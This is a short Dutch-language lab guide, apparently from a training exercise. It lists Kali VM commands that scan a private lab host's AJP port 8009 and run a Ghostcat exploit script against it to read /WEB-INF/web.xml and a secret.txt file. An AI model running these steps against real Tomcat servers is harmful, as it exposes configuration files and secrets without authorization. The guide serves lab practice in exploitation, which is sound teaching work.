# 4) Starten van de aanval

## 1) Stappen om de aanval succesvol uit te voeren (Kali VM)

- open terminal in kali vm
- voer volgende commando's uit: 
- 4.1) sudo systemctl start ssh
- 4.2) sudo systemctl enable ssh
- 4.3) cd Desktop
- 4.4) sudo chmod +x exploit_ghostcat.py
- 4.5) nmap 10.10.10.4 -p 8009
- 4.6) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/web.xml read
- 4.7) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/secret.txt read
